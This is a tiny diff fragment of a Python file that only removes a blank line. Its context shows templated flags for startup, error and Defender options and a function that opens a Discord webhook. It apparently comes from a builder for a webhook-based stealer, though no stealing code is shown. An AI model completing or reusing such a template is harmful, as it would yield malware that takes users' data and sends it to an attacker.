@@ -32,7 +32,6 @@ __ERROR__ = "%_error_enabled%"
 __STARTUP__ = "%_startup_enabled%"
 __DEFENDER__ = "%_defender_enabled%"
 
-
 def main(webhook: str):
     webhook = SyncWebhook.from_url(webhook, session=requests.Session())
 
